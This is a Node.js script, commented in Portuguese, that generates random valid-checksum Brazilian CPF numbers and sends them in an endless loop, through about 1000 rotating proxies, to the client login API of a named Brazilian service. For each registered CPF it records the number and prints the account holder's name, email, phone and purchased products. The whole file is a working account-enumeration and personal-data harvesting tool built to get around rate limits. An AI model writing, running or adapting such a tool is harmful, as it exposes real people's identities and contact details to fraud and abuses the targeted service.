#!/usr/bin/env node

/**
 * Modo Contínuo Sem Limite - Gemeos CPF Checker com Proxy Rotativo
 * 
 * Executa continuamente em lotes de 20 CPFs usando proxies rotativos
 * Salva apenas CPFs válidos em formato TXT
 */

const chalk = require('chalk');
// Função simples de geração de CPF (substitui cpf-generator.js)
function generateCPF() {
  const n1 = Math.floor(Math.random() * 9);
  const n2 = Math.floor(Math.random() * 9);
  const n3 = Math.floor(Math.random() * 9);
  const n4 = Math.floor(Math.random() * 9);
  const n5 = Math.floor(Math.random() * 9);
  const n6 = Math.floor(Math.random() * 9);
  const n7 = Math.floor(Math.random() * 9);
  const n8 = Math.floor(Math.random() * 9);
  const n9 = Math.floor(Math.random() * 9);
  
  let d1 = n9*2 + n8*3 + n7*4 + n6*5 + n5*6 + n4*7 + n3*8 + n2*9 + n1*10;
  d1 = 11 - (d1 % 11);
  if (d1 >= 10) d1 = 0;
  
  let d2 = d1*2 + n9*3 + n8*4 + n7*5 + n6*6 + n5*7 + n4*8 + n3*9 + n2*10 + n1*11;
  d2 = 11 - (d2 % 11);
  if (d2 >= 10) d2 = 0;
  
  return `${n1}${n2}${n3}${n4}${n5}${n6}${n7}${n8}${n9}${d1}${d2}`;
}

function generateMultipleCPFs(count) {
  const cpfs = [];
  for (let i = 0; i < count; i++) {
    cpfs.push(generateCPF());
  }
  return cpfs;
}
const GemeosChecker = require('./api-checker');

let totalCPFsVerified = 0;
let totalValidCPFsFound = 0;
let sessionStartTime = new Date();

async function runContinuousChecker() {
  const cpfsPerRound = 20; // 20 CPFs por lote para máxima eficiência
  const delayBetweenBatches = 5000; // 5 segundos entre cada lote
  
  console.log(chalk.blue('🔄 GEMEOS CPF CHECKER - MODO CONTÍNUO COM PROXY ROTATIVO'));
  console.log(chalk.blue('='.repeat(60)));
  console.log(chalk.white(`⏱️  Delay entre lotes: ${delayBetweenBatches}ms (5 segundos)`));
  console.log(chalk.white(`📦 CPFs por lote: ${cpfsPerRound}`));
  console.log(chalk.white(`🔗 API: https://api.gemeosbrasil.com.br/api/auth/login/client`));
  console.log(chalk.white(`🌐 Proxies: Webshare (1000 proxies rotativos)`));
  console.log(chalk.white(`🚀 Iniciado em: ${sessionStartTime.toLocaleString('pt-BR')}`));
  console.log(chalk.green('🔄 Modo: CONTÍNUO SEM LIMITE COM PROXY ROTATIVO'));
  console.log('');
  
  console.log(chalk.yellow('⚠️  ATENÇÃO: Execução contínua ativa!'));
  console.log(chalk.yellow('   Pressione Ctrl+C para parar a qualquer momento'));
  console.log('');
  
  // Inicia o checker
  const checker = new GemeosChecker({
    delay: delayBetweenBatches,
    timeout: 15000,
    maxRetries: 2
  });
  
  let cpfCounter = 0;
  
  // Loop infinito
  while (true) {
    try {
      // Calcula tempo de execução
      const elapsed = new Date() - sessionStartTime;
      const elapsedMinutes = Math.floor(elapsed / 60000);
      const elapsedSeconds = Math.floor((elapsed % 60000) / 1000);
      
      // Gera lotes de CPFs
      const cpfs = generateMultipleCPFs(cpfsPerRound);
      
      // Exibe informações do lote
      console.log(chalk.blue(`📦 LOTE #${cpfCounter + 1} | ${cpfsPerRound} CPFs | Tempo: ${elapsedMinutes}m ${elapsedSeconds}s`));
      console.log(chalk.white(`🔢 CPFs: ${cpfs.slice(0, 3).join(', ')}${cpfs.length > 3 ? ` ... (+${cpfs.length - 3} mais)` : ''}`));
      
      // Verifica o lote de CPFs
      const results = await checker.checkMultipleCPFs(cpfs);
      
      // Processa resultados do lote
      let validCPFsInBatch = 0;
      let errorsInBatch = 0;
      
      results.forEach(result => {
        totalCPFsVerified++;
        
        if (result.success) {
          // Verifica se o CPF tem cadastro
          if (result.data && result.data.signIn === true) {
            console.log(chalk.yellow(`   ❓ NÃO CADASTRADO`));
          } else if (result.data && result.data.signIn === false) {
            console.log(chalk.green(`   ✅ CADASTRADO (signIn: false)`));
            totalValidCPFsFound++;
            validCPFsInBatch++;
            checker.addValidCPF(result.cpf);
          } else if (result.data && result.data.user && result.data.accessToken) {
            // CPF com cadastro (retorna dados completos do usuário)
            console.log(chalk.green(`   ✅ CADASTRADO (dados completos)`));
            console.log(chalk.blue(`      👤 Nome: ${result.data.user.name}`));
            console.log(chalk.blue(`      📧 Email: ${result.data.user.email}`));
            console.log(chalk.blue(`      📱 Telefone: ${result.data.user.phone}`));
            
            // Exibe informações dos produtos/títulos se disponível
            if (result.products && result.products.success && result.products.data && result.products.data.length > 0) {
              console.log(chalk.cyan(`      📦 Produtos: ${result.products.data.length}`));
              result.products.data.forEach((product, index) => {
                if (product.productId && product.productId.title) {
                  console.log(chalk.cyan(`         ${index + 1}. ${product.productId.title}`));
                }
              });
            }
            
            totalValidCPFsFound++;
            validCPFsInBatch++;
            checker.addValidCPF(result.cpf);
          } else {
            console.log(chalk.gray(`   ❓ Resposta não identificada`));
          }
        } else {
          errorsInBatch++;
          console.log(chalk.red(`   ❌ ERRO: ${result.error}`));
        }
      });
      
      // Exibe resumo do lote
      console.log(chalk.cyan(`   📊 Lote concluído: ${validCPFsInBatch} válidos, ${errorsInBatch} erros`));
      console.log(chalk.cyan(`   📊 Total de CPFs válidos: ${totalValidCPFsFound}`));
      console.log(chalk.cyan(`   📊 Total de CPFs verificados: ${totalCPFsVerified}`));
      
      // Salva resultados se houver CPFs válidos
      if (validCPFsInBatch > 0) {
        await checker.saveResults();
      }
      
      // Incrementa contador de lotes
      cpfCounter++;
      
      // Aguarda antes do próximo lote
      console.log(chalk.gray(`   ⏱️  Aguardando ${delayBetweenBatches / 1000}s...`));
      await checker.sleep(delayBetweenBatches);
      
    } catch (error) {
      console.error(chalk.red('❌ Erro durante a execução:'));
      console.error(chalk.red(error.message));
      
      // Aguarda antes de tentar novamente
      console.log(chalk.yellow('⏱️  Aguardando 10s antes de tentar novamente...'));
      await checker.sleep(10000);
    }
  }
}

// Função para salvar um CPF válido individualmente
async function saveSingleValidCPF(result) {
  const fs = require('fs-extra');
  const path = require('path');
  
  try {
    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
    const filename = `valid-cpf-continuous-${timestamp}.txt`;
    const filepath = path.join(__dirname, filename);
    
    const content = `CPF: ${result.cpf}\n` +
                   `Data: ${new Date().toLocaleString('pt-BR')}\n` +
                   `Status: ${result.data.signIn === false ? 'Cadastrado (signIn: false)' : 'Cadastrado (dados completos)'}\n` +
                   `Tempo de resposta: ${result.responseTime}ms\n` +
                   `Proxy usado: ${result.proxy ? `${result.proxy.host}:${result.proxy.port}` : 'Nenhum'}\n` +
                   `---\n`;
    
    await fs.appendFile(filepath, content);
    console.log(chalk.green(`   💾 CPF salvo em: ${filename}`));
  } catch (error) {
    console.error(chalk.red(`   ❌ Erro ao salvar CPF: ${error.message}`));
  }
}

// Função para exibir estatísticas finais
function showFinalStats() {
  const totalTime = new Date() - sessionStartTime;
  const totalMinutes = Math.floor(totalTime / 60000);
  const totalSeconds = Math.floor((totalTime % 60000) / 1000);
  
  console.log(chalk.blue('\n📊 ESTATÍSTICAS FINAIS'));
  console.log(chalk.blue('='.repeat(40)));
  console.log(chalk.white(`Tempo total de execução: ${totalMinutes}m ${totalSeconds}s`));
  console.log(chalk.white(`Total de CPFs verificados: ${totalCPFsVerified}`));
  console.log(chalk.white(`Total de CPFs válidos encontrados: ${totalValidCPFsFound}`));
  
  if (totalCPFsVerified > 0) {
    const successRate = ((totalValidCPFsFound / totalCPFsVerified) * 100).toFixed(2);
    console.log(chalk.white(`Taxa de sucesso: ${successRate}%`));
  }
  
  console.log(chalk.green('\n🎉 Execução finalizada!'));
}

// Captura sinais de interrupção
process.on('SIGINT', () => {
  console.log(chalk.yellow('\n\n⚠️  Interrupção detectada!'));
  showFinalStats();
  process.exit(0);
});

process.on('SIGTERM', () => {
  console.log(chalk.yellow('\n\n⚠️  Terminação solicitada!'));
  showFinalStats();
  process.exit(0);
});

// Executa o checker
if (require.main === module) {
  runContinuousChecker().catch(error => {
    console.error(chalk.red('❌ Erro fatal:'));
    console.error(chalk.red(error.message));
    showFinalStats();
    process.exit(1);
  });
}

module.exports = { runContinuousChecker };
